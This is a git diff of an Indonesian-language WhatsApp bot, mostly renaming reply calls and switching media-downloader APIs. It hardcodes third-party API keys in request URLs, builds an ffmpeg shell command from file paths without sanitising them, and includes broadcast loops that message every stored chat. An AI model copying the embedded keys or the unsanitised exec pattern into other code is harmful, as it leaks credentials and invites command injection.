 db.data.chats[m.chat].antilink = false
-m.reply(`Antilink Tidak Aktif !`)
+reply(`Antilink Tidak Aktif !`)
 } else {
 let buttons = [
 { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
@@ -1261,13 +1264,13 @@ if (!m.isGroup) throw mess.group
 if (!isBotAdmins) throw mess.botAdmin
 if (!isAdmins) throw mess.admin
 if (args[0] === "on") {
-if (db.data.chats[m.chat].antilinkyt) return m.reply(`Sudah Aktif Sebelumnya`)
+if (db.data.chats[m.chat].antilinkyt) return reply(`Sudah Aktif Sebelumnya`)
 db.data.chats[m.chat].antilinkyt = true
-m.reply(`Antilink Aktif Youtube !`)
+reply(`Antilink Aktif Youtube !`)
 } else if (args[0] === "off") {
-if (!db.data.chats[m.chat].antilinkyt) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
+if (!db.data.chats[m.chat].antilinkyt) return reply(`Sudah Tidak Aktif Sebelumnya`)
 db.data.chats[m.chat].antilinkyt = false
-m.reply(`Antilink Tidak Aktif !`)
+reply(`Antilink Tidak Aktif !`)
 } else {
 let buttons = [
 { buttonId: 'antilinkyt on', buttonText: { displayText: 'On' }, type: 1 },
@@ -1282,13 +1285,13 @@ if (!m.isGroup) throw mess.group
 if (!isBotAdmins) throw mess.botAdmin
 if (!isAdmins) throw mess.admin
 if (args[0] === "on") {
-if (db.data.chats[m.chat].antilinktt) return m.reply(`Sudah Aktif Sebelumnya`)
+if (db.data.chats[m.chat].antilinktt) return reply(`Sudah Aktif Sebelumnya`)
 db.data.chats[m.chat].antilinktt = true
-m.reply(`Antilink Aktif Tiktok !`)
+reply(`Antilink Aktif Tiktok !`)
 } else if (args[0] === "off") {
-if (!db.data.chats[m.chat].antilinktt) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
+if (!db.data.chats[m.chat].antilinktt) return reply(`Sudah Tidak Aktif Sebelumnya`)
 db.data.chats[m.chat].antilinktt = false
-m.reply(`Antilink Tidak Aktif !`)
+reply(`Antilink Tidak Aktif !`)
 } else {
 let buttons = [
 { buttonId: 'antilinktt on', buttonText: { displayText: 'On' }, type: 1 },
@@ -1301,13 +1304,13 @@ break
 case 'anticall': {
 if (!isCreator) return replay(mess.owner)
 if (args[0] === "on") {
-if (db.data.settings[botNumber].anticall) return m.reply(`Sudah Aktif Sebelumnya`)
+if (db.data.settings[botNumber].anticall) return reply(`Sudah Aktif Sebelumnya`)
 db.data.settings[botNumber].anticall = true
-m.reply(`Anticall Berhasil Di Aktifkan !`)
+reply(`Anticall Berhasil Di Aktifkan !`)
 } else if (args[0] === "off") {
-if (!db.data.settings[botNumber].anticall) return m.reply(`Sudah Nonaktif Sebelumnya`)
+if (!db.data.settings[botNumber].anticall) return reply(`Sudah Nonaktif Sebelumnya`)
 db.data.settings[botNumber].anticall = false
-m.reply(`Anticall Berhasil Di Nonaktifkan !`)
+reply(`Anticall Berhasil Di Nonaktifkan !`)
 } else {
 let buttonsanticall = [
 { buttonId: `${command} on`, buttonText: { displayText: 'Enable' }, type: 1 },
@@ -1322,13 +1325,13 @@ if (!m.isGroup) throw mess.group
 if (!isBotAdmins) throw mess.botAdmin
 if (!isAdmins) throw mess.admin
 if (args[0] === "on") {
-if (db.data.chats[m.chat].antilinkig) return m.reply(`Sudah Aktif Sebelumnya`)
+if (db.data.chats[m.chat].antilinkig) return reply(`Sudah Aktif Sebelumnya`)
 db.data.chats[m.chat].antilinkig = true
-m.reply(`Antilink Aktif Instagram !`)
+reply(`Antilink Aktif Instagram !`)
 } else if (args[0] === "off") {
-if (!db.data.chats[m.chat].antilinkig) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
+if (!db.data.chats[m.chat].antilinkig) return reply(`Sudah Tidak Aktif Sebelumnya`)
 db.data.chats[m.chat].antilinkig = false
-m.reply(`Antilink Instagram Tidak Aktif !`)
+reply(`Antilink Instagram Tidak Aktif !`)
 } else {
 let buttons = [
 { buttonId: 'antilinkig on', buttonText: { displayText: 'On' }, type: 1 },
@@ -1343,13 +1346,13 @@ break
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
                 if (args[0] === "on") {
-                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
+                if (db.data.chats[m.chat].mute) return reply(`Sudah Aktif Sebelumnya`)
                 db.data.chats[m.chat].mute = true
-                m.reply(`${SatganzDevs.user.name} telah di mute di group ini !`)
+                reply(`${SatganzDevs.user.name} telah di mute di group ini !`)
                 } else if (args[0] === "off") {
-                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
+                if (!db.data.chats[m.chat].mute) return reply(`Sudah Tidak Aktif Sebelumnya`)
                 db.data.chats[m.chat].mute = false
-                m.reply(`${SatganzDevs.user.name} telah di unmute di group ini !`)
+                reply(`${SatganzDevs.user.name} telah di unmute di group ini !`)
                 } else {
                  let buttons = [
                         { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
@@ -1372,9 +1375,9 @@ break
                 if (!isAdmins) throw mess.admin
                 if (!text) throw 'Masukkan value enable/disable'
                 if (args[0] === 'enable') {
-                    await SatganzDevs.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    await SatganzDevs.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                 } else if (args[0] === 'disable') {
-                    await SatganzDevs.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    await SatganzDevs.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                 }
             }
             break
@@ -1409,16 +1412,16 @@ for (let i of anu) {
 await sleep(1500)
 var button = [{ buttonId: `tesrow`, buttonText: { displayText: `MENU‡` }, type: 1 }, { buttonId: `sewabot`, buttonText: { displayText: `SEWABOT‡` }, type: 1 }]
 let txt = `*「 ${global.ownername}'s Broadcast」*\n\n${text}`
-SatganzDevs.send5ButImg(i, txt, `assistant bots`, log0, btn, thum)
+SatganzDevs.send5ButImg(i, txt, `© OchoBot`, log0, btn, thum)
 }
 replay(`Successfully Sent Broadcast To ${anu.length} Group`)
 }
 break
 case 'bc': case 'broadcast': case 'bcall': {
 var fdoc = { key : { remoteJid: 'status@broadcast', participant : '0@s.whatsapp.net' }, message: { documentMessage: { title: 'B R O A D C A S T', jpegThumbnail: global.thumb, }}}
-if (!isCreator && !m.key.fromMe) return m.reply(mess.botOwner)
+if (!isCreator && !m.key.fromMe) return reply(mess.botOwner)
 let anu = await store.chats.all().map(v => v.id)
-m.reply(mess.wait + '\nMohon Untuk Menunggu Sejenak')
+reply(mess.wait + '\nMohon Untuk Menunggu Sejenak')
 for (let yoi of anu) {
 if (/image/.test(mime)) {
 await sleep(1500)
@@ -1449,7 +1452,7 @@ var txtbc = `*Broadcast SatganzDevsBotz*\n\n*✉️ Message :* ${q? q : ''}\n`
 var btnbc = [{ buttonId: `owner`, buttonText: { displayText: `OWNER‡` }, type: 1 }]
 await SatganzDevs.sendButtonText(yoi, btnbc, txtbc, '', fdoc)
 }
-m.reply('Sukses Broadcast')
+reply('Sukses Broadcast')
 }
 }
 break
@@ -1464,21 +1467,21 @@ const reSize = (buffer, ukur1, ukur2) => {
 }
 buffer = global.SatganzDevsbc
 if (!isCreator) return replay(mess.owner)
-                if (!text) return m.reply(`Use ${prefix}bcloc text\n\nExample : ${prefix + command} attention everybody`)
+                if (!text) return reply(`Use ${prefix}bcloc text\n\nExample : ${prefix + command} attention everybody`)
                 let anu = await store.chats.all().map(v => v.id)
                 let [melo, melo2] = text.split`|`
-                m.reply(`*Send Broadcast To* ${anu.length} Chat\nTime ${anu.length * 1.5} sec`)
+                reply(`*Send Broadcast To* ${anu.length} Chat\nTime ${anu.length * 1.5} sec`)
 	     	for (let yoi of anu) {
 	     	await sleep(1500)
 		    var button = [{ buttonId: `owner`, buttonText: { displayText: `OWNER‡` }, type: 1 }, { buttonId: `DONASI`, buttonText: { displayText: `DONASI‡` }, type: 1 }]             
-            SatganzDevs.sendMessage(yoi, { caption: `${melo}`, location: { jpegThumbnail: await reSize(buffer, 200, 200) }, buttons: button, footer: `assistant bots`, mentions: [m.sender] })
+            SatganzDevs.sendMessage(yoi, { caption: `${melo}`, location: { jpegThumbnail: await reSize(buffer, 200, 200) }, buttons: button, footer: `© OchoBot`, mentions: [m.sender] })
 		}		
             }
             break
             case 'q': case 'quoted': {
-		if (!m.quoted) return m.reply('Reply Pesannya!!')
+		if (!m.quoted) return reply('Reply Pesannya!!')
 		let wokwol = await SatganzDevs.serializeM(await m.getQuotedObj())
-		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
+		if (!wokwol.quoted) return reply('Pesan Yang anda reply tidak mengandung reply')
 		await wokwol.quoted.copyNForward(m.chat, true)
             }
 	    break
@@ -1510,13 +1513,13 @@ if (!isCreator) return replay(mess.owner)
              break
             case 'sticker': case 's': case 'stickergif': case 'sgif': {
             if (!quoted) throw `*Balas Video/Image Dengan Caption* ${prefix + command}`
-            m.reply(mess.wait)
+            reply(mess.wait)
                     if (/image/.test(mime)) {
                 let media = await quoted.download()
                 let encmedia = await SatganzDevs.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                 await fs.unlinkSync(encmedia)
             } else if (/video/.test(mime)) {
-                if ((quoted.msg || quoted).seconds > 11) return m.reply('*Maksimal 10 detik!*')
+                if ((quoted.msg || quoted).seconds > 11) return reply('*Maksimal 10 detik!*')
                 let media = await quoted.download()
                 let encmedia = await SatganzDevs.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                 await fs.unlinkSync(encmedia)
@@ -1529,14 +1532,14 @@ if (!isCreator) return replay(mess.owner)
             if (!text) throw `Example : ${prefix + command} text`
             let { eBinary } = require('./lib/binary')
             let eb = await eBinary(text)
-            m.reply(eb)
+            reply(eb)
         }
         break
             case 'dbinary': {
             if (!text) throw `Example : ${prefix + command} text`
             let { dBinary } = require('./lib/binary')
             let db = await dBinary(text)
-            m.reply(db)
+            reply(db)
         }
         break
             case 'emojimix': {
@@ -1573,7 +1576,7 @@ break
 	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
 	        if (!/image/.test(mime)) throw respond
             if (!text) throw respond
-	        m.reply(mess.wait)
+	        reply(mess.wait)
             atas = text.split('|')[0] ? text.split('|')[0] : '-'
             bawah = text.split('|')[1] ? text.split('|')[1] : '-'
             let { TelegraPh } = require('./lib/uploader')
@@ -1587,13 +1590,13 @@ break
 	        case 'simih': case 'simisimi': {
             if (!text) throw `Example : ${prefix + command} text`
             hm = await fetchJson(api('zenz', '/api/simisimi', { text : text }, 'f22b3c4c2c'))
-            m.reply(hm.result.message)
+            reply(hm.result.message)
             }
             break
             case 'toimage': case 'toimg': {
                 if (!quoted) throw 'Reply Image'
                 if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
-                m.reply(mess.wait)
+                reply(mess.wait)
                 let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted)
                 let ran = await getRandom('.png')
                 exec(`ffmpeg -i ${media} ${ran}`, (err) => {
@@ -1609,7 +1612,7 @@ break
 case 'toimage': case 'toimg': {
 if (!quoted) throw 'Reply Image'
 if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
-m.reply(mess.wait)
+reply(mess.wait)
 let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted)
 let ran = await getRandom('.png')
 exec(`ffmpeg -i ${media} ${ran}`, (err) => {
@@ -1624,7 +1627,7 @@ break
 case 'tomp4': case 'tovideo': {
 if (!quoted) throw 'Reply Image'
 if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
-m.reply(mess.wait)
+reply(mess.wait)
 let { webp2mp4File } = require('./lib/uploader')
 let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted)
 let webpToMp4 = await webp2mp4File(media)
@@ -1635,7 +1638,7 @@ break
 case 'toaud': case 'toaudio': {
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
 if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
-m.reply(mess.wait)
+reply(mess.wait)
 let media = await quoted.download()
 let { toAudio } = require('./lib/converter')
 let audio = await toAudio(media, 'mp4')
@@ -1646,7 +1649,7 @@ case 'tomp3': {
 if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
 if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
-m.reply(mess.wait)
+reply(mess.wait)
 let media = await quoted.download()
 let { toAudio } = require('./lib/converter')
 let audio = await toAudio(media, 'mp4')
@@ -1656,7 +1659,7 @@ break
 case 'tovn': case 'toptt': {
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
 if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
-m.reply(mess.wait)
+reply(mess.wait)
 let media = await quoted.download()
 let { toPTT } = require('./lib/converter')
 let audio = await toPTT(media, 'mp4')
@@ -1666,7 +1669,7 @@ break
 case 'togif': {
 if (!quoted) throw 'Reply Image'
 if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
-m.reply(mess.wait)
+reply(mess.wait)
 let { webp2mp4File } = require('./lib/uploader')
 let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted)
 let webpToMp4 = await webp2mp4File(media)
@@ -1675,15 +1678,15 @@ await fs.unlinkSync(media)
 }
 break
 case 'tourl': {
-m.reply(mess.wait)
+reply(mess.wait)
 let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
 let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted)
 if (/image/.test(mime)) {
 let anu = await TelegraPh(media)
-m.reply(util.format(anu))
+reply(util.format(anu))
 } else if (!/image/.test(mime)) {
 let anu = await UploadFileUgu(media)
-m.reply(util.format(anu))
+reply(util.format(anu))
 }
 await fs.unlinkSync(media)
 }
@@ -1699,7 +1702,7 @@ break
 	    hmm = await './src/remobg-'+getRandom('')
 	    localFile = await SatganzDevs.downloadAndSaveMediaMessage(quoted, hmm)
 	    outputFile = await './src/hremo-'+getRandom('.png')
-	    m.reply(mess.wait)
+	    reply(mess.wait)
 	    remobg.removeBackgroundFromImageFile({
 	      path: localFile,
 	      apiKey: apinobg,
@@ -1736,7 +1739,7 @@ teks += `あ *Title* : ${g.title}\n`
 teks += `あ *Description* : ${g.snippet}\n`
 teks += `あ *Link* : ${g.link}\n\n────────────────────────\n\n`
 } 
-m.reply(teks)
+reply(teks)
 })
 }
 break
@@ -1762,7 +1765,7 @@ teks += `あ *Title* : ${g.title}\n`
 teks += `あ *Description* : ${g.snippet}\n`
 teks += `あ *Link* : ${g.link}\n\n────────────────────────\n\n`
 } 
-m.reply(teks)
+reply(teks)
 })
 }
 break
@@ -1796,26 +1799,30 @@ SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
 break
 case 'ytmp3': case 'ytaudio': {
-let { yta } = require('./lib/y2mate')
 if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
 let quality = args[1] ? args[1] : '128kbps'
-let media = await yta(text, quality)
-if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
-SatganzDevs.sendImage(m.chat, media.thumb, `あ Title : ${media.title}\nあ File Size : ${media.filesizeF}\nあ Url : ${isUrl(text)}\nあ Ext : MP3\nあ Resolusi : ${args[1] || '128kbps'}`, m)
-SatganzDevs.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
-}
-break
+let media = await fetchJson(`https://zenzapis.xyz/downloader/youtube?apikey=79fe4911db&url=${q}`)
+if (media.result.sizeAudio >= 100000) return reply('File Melebihi Batas '+util.format(media))
+ console.log(media)
+SatganzDevs.sendImage(m.chat, media.result.thumb, `あ Title : ${media.result.title}\nあ File Size : ${media.result.sizeAudio}\nあ Url : ${isUrl(text)}\nあ Ext : MP3\nあ Resolusi : ${args[1] || '128kbps'}`, m)
+SatganzDevs.sendMessage(m.chat, { audio: { url: media.result.getAudio  }, mimetype: 'audio/mpeg', fileName: `${media.result.title}.mp3` }, { quoted: m })
+ }
+ break
 case 'ytmp4': case 'ytvideo': {
-let { ytv } = require('./lib/y2mate')
 if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
 let quality = args[1] ? args[1] : '360p'
-let media = await ytv(text, quality)
-if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
-SatganzDevs.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `あ Title : ${media.title}\nあ File Size : ${media.filesizeF}\nあ Url : ${isUrl(text)}\nあ Ext : MP3\nあ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
-}
-break
+bocils.youtubedlv2(q).then(res => {
+let buttons = [
+{"buttonId": `${prefix}tiktokaudio${args[0]} `,"buttonText": {"displayText": `audio`},"type": "RESPONSE"}]
+let ep = res
+if (ep.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
+ console.log(ep)
+SatganzDevs.sendMessage(m.chat, { video: { url: ep.video }, mimetype: 'video/mp4', fileName: `${ep.title}.mp4`, caption: `あ Title : ${ep.title}\nあ File Size : ${ep.filesizeH}\nあ Url : ${isUrl(text)}\nあ Ext : MP3\nあ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
+ })
+ }
+ break
             case 'pinterest': {
-                m.reply(mess.wait)
+                reply(mess.wait)
 		let { pinterest } = require('./lib/scraper')
                 anu = await pinterest(text)
                 result = anu[Math.floor(Math.random() * anu.length)]
@@ -1827,21 +1834,21 @@ case 'createcp':
 let domain = q.split('|')[2]
 let usern = q.split('|')[0]
 let pekeg = q.split('|')[1]
-if (args.length < 2) return m.reply(`Kirim perintah ${command} domain|package`)
-m.reply("Creating please wait....")
+if (args.length < 2) return reply(`Kirim perintah ${command} domain|package`)
+reply("Creating please wait....")
 
 axios.get(`https://${hostwhm}:2087/json-api/createacct?api.version=1&username=${usern}&contactemail=shymex404@gmail.com&pekeg=${pekeg}&domain=${domain}`, authWhm)
 .then(response => {     
      let np = response.data
           if (np.metadata.result == 0) {
-           m.reply(np.metadata.reason)
+           reply(np.metadata.reason)
           } else {
            let dsta = np.metadata.output.raw;
             var substr = dsta.substring(
               dsta.toString().indexOf("+===================================+")
             ); //substr = 'word. Hello!'
             let nefft = substr.split("| Language: en")[0];
-            m.reply(`${nefft}\n\nLogin : https://${hostwhm}:2087`)
+            reply(`${nefft}\n\nLogin : https://${hostwhm}:2087`)
   }});
 break
 case 'listcp':
@@ -1888,7 +1895,7 @@ axios
     })
 break
             case 'waifu': {
-            	m.reply(mess.wait)
+            	reply(mess.wait)
                 anu = await fetchJson(`https://waifu.pics/api/sfw/waifu`)
                 buffer = await getBuffer(anu.url)
                 let buttons = [{buttonId: `waifu`, buttonText: {displayText: 'Next Image'}, type: 1},{buttonId: `simplemenu`, buttonText: {displayText: '⬅️Back'}, type: 1}]
@@ -1903,7 +1910,7 @@ break
             }
             break
 	    case 'couple': {
-                m.reply(mess.wait)
+                reply(mess.wait)
                 let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                 let random = anu[Math.floor(Math.random() * anu.length)]
                 SatganzDevs.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
@@ -2012,7 +2019,7 @@ let buttons = [{ buttonId: `tesrow`, buttonText: {displayText: 'BACK‡'}, type:
 //AKHIR FITUR SHORT YA ADICK" WKWKWK//
 case 'ssweb': case 'ss': {
                 if (!text) throw 'No Query Link'
-                m.reply(mess.wait)
+                reply(mess.wait)
                 SatganzDevs.sendMessage(m.chat, { image: { url: `https://SatganzDevsbotz-apii.herokuapp.com/api/tools/ssweb?link=${text}` }, caption: `SSWEB DONE` }, { quoted: m })
             }
             break
@@ -2026,7 +2033,7 @@ let teks = `Srtle Text From ${text}\n\n`
 for (let i of anu) {
 teks += `あ *${i.name}* : ${i.result}\n\n`
 }
-m.reply(teks)
+reply(teks)
 }
 break
 //SELESAAAI//
@@ -2198,7 +2205,7 @@ break
 //━━━━━━━━━━━━━━━[ TEXT PRO ]━━━━━━━━━━━━━━━━━//
             case 'berry': case 'glitch': case 'neon': case '3dboxtext': case 'pencil': case 'logobear': case '3dchristmas': case 'thunder': case 'magma': case 'strawberry': {
                 if (!text) throw 'No Query Text'
-                m.reply(mess.wait)
+                reply(mess.wait)
                 SatganzDevs.sendMessage(m.chat, { image: { url: `https://api-SatganzDevsbotz.herokuapp.com/api/textpro/${command}?text=${text}` }, caption: `textpro ${command}` }, { quoted: m })
             }
             break
@@ -2215,7 +2222,7 @@ break
 			break
             case 'glitchtiktok': {
                 if (!text) throw 'No Query Text'
-                m.reply(mess.wait)
+                reply(mess.wait)
                 SatganzDevs.sendMessage(m.chat, { image: { url: `https://SatganzDevsbotz-apiiiii.herokuapp.com/api/textpro/glitchtiktok?text=${text}&text2=${text}&apikey=SatganzDevs` }, caption: `textpro ${command}` }, { quoted: m })
                 }
                 break
@@ -2228,8 +2235,8 @@ case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 
 case 'chocolate': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
 case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':
  case 'firework': case 'skeleton': case 'sand': case 'glue': case '1917': case 'leaves': {
-             if (!q) return m.reply(`Example : ${prefix + command} SatganzDevs`) 
-             m.reply(mess.wait)
+             if (!q) return reply(`Example : ${prefix + command} SatganzDevs`) 
+             reply(mess.wait)
              let link
              if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
              if (/colorneon/.test(command)) link = 'https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html'
@@ -2301,8 +2308,8 @@ case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': ca
              }
              break
              case 'glitch2': case 'harrypot': case 'graffiti': case 'pornhub': case 'glitch3': case '3dspace': case 'lion': case 'wolf': case 'retro': case '8bit': {
-             if(!q) return m.reply(`Use ${prefix + command} text1|text2`)
-             m.reply(mess.wait)
+             if(!q) return reply(`Use ${prefix + command} text1|text2`)
+             reply(mess.wait)
              teks1 = q.split("|")[0]
              teks2 = q.split("|")[1]
              let link
@@ -2324,13 +2331,13 @@ case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': ca
 //INI FITUR Photooxy YA ADICK"//
 case 'carved-wood': case 'picture-of-love': case 'naruto': case 'butterfly': case 'pubg': case 'illuminated-metallic': case 'flower-typography': case 'sweet-candy': case 'coffee-cup': case 'under-grass': case 'night-sky': case 'harry-potter': case 'metallic': case 'shadow': {
                 if (!text) throw 'No Query Text'
-                m.reply(mess.wait)
+                reply(mess.wait)
                 SatganzDevs.sendMessage(m.chat, { image: { url: `https://SatganzDevsbotz-apii.herokuapp.com/api/photooxy/${command}?text=${text}` }, caption: `textpro ${command}` }, { quoted: m })
             }
             break
 case 'berry': case 'blackpink': case 'glitch': case 'neon': case '3dboxtext': case 'pencil': case 'logobear': case '3dchristmas': case 'thunder': case 'magma': case 'strawberry': {
                 if (!text) throw 'No Query Text'
-                m.reply(mess.wait)
+                reply(mess.wait)
                 SatganzDevs.sendMessage(m.chat, { image: { url: `https://SatganzDevsbotz-apii.herokuapp.com/api/textpro/${command}?text=${text}` }, caption: `textpro ${command}` }, { quoted: m })
             }
             break
@@ -2347,7 +2354,7 @@ case 'trigger':
 case 'invert':
 case 'facepalm': {
 if (!m.quoted && !text) throw `reply gambar/Sticker dengan caption ${prefix + command}`
-m.reply(mess.wait)
+reply(mess.wait)
 let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
 let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted)
 res = await TelegraPh(media)
@@ -2356,9 +2363,9 @@ xuntul = await SatganzDevs.sendMessage(m.chat, { image: { url: kontol }}, {quote
 }
             break
 case 'tiktok':{ 
-if (!text) return m.reply( `Example : ${prefix + command} link`)
-if (!isUrl) return m.reply(`Kontol Serius anjing, Itu Bukan Link Tiktok Njing`)
-m.reply(mess.wait)
+if (!text) return reply( `Example : ${prefix + command} link`)
+if (!isUrl) return reply(`Kontol Serius anjing, Itu Bukan Link Tiktok Njing`)
+reply(mess.wait)
 bocils.tiktokdlv2(q).then(res => {
 let buttons = [
 {"buttonId": `${prefix}tiktokaudio${args[0]} `,"buttonText": {"displayText": `audio`},"type": "RESPONSE"}]
@@ -2369,9 +2376,9 @@ SatganzDevs.sendMessage(m.chat, {caption: "Nih", video: {url: ep }, buttons },{ 
  }
  break
 case 'tiktokaudio':{
-if (!text) return m.reply( `Example : ${prefix + command} link`)
-if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
-m.reply(mess.wait)
+if (!text) return reply( `Example : ${prefix + command} link`)
+if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
+reply(mess.wait)
 bocils.tiktokdlv2(q).then(res => {
 let epik = res.music
  console.log(ep)
@@ -2383,63 +2390,63 @@ let epik = res.music
 //━━━━━━━━━━━━━━━[ WEBZONE ]━━━━━━━━━━━━━━━━━//
 //━━━━━━━━━━━━━━━[ RANDOM ASUPAN ]━━━━━━━━━━━━━━━━━//
 case 'asupan':
-m.reply(mess.wait)
+reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var asupan = JSON.parse(fs.readFileSync('./storage/asupan/asupan.json'))
 var hasil = pickRandom(asupan)
 SatganzDevs.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
 break
 case 'asupanghea':
-m.reply(mess.wait)
+reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var gheayubi = JSON.parse(fs.readFileSync('./storage/asupan/gheayubi.json'))
 var hasil = pickRandom(gheayubi)
 SatganzDevs.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
 break
 case 'asupanbocil':
-m.reply(mess.wait)
+reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var bocil = JSON.parse(fs.readFileSync('./storage/asupan/bocil.json'))
 var hasil = pickRandom(bocil)
 SatganzDevs.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
 break
 case 'asupanukhty':
-m.reply(mess.wait)
+reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ukhty = JSON.parse(fs.readFileSync('./storage/asupan/ukhty.json'))
 var hasil = pickRandom(ukhty)
 SatganzDevs.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
 break
 case 'asupansantuy':
-m.reply(mess.wait)
+reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var santuy = JSON.parse(fs.readFileSync('./storage/asupan/santuy.json'))
 var hasil = pickRandom(santuy)
 SatganzDevs.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
 break
 case 'asupankayes':
-m.reply(mess.wait)
+reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var kayes = JSON.parse(fs.readFileSync('./storage/asupan/kayes.json'))
 var hasil = pickRandom(kayes)
 SatganzDevs.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
 break
 case 'asupanrika':
-m.reply(mess.wait)
+reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var rikagusriani = JSON.parse(fs.readFileSync('./storage/asupan/rikagusriani.json'))
 var hasil = pickRandom(rikagusriani)
 SatganzDevs.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
 break
 case 'asupannotnot':
-m.reply(mess.wait)
+reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./storage/asupan/asupannotnot.json'))
 var hasil = pickRandom(notnot)
 SatganzDevs.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
 break
 case 'storyanime':
-m.reply(mess.wait)
+reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var storyanime = JSON.parse(fs.readFileSync('./storage/video/storyanime.js'))
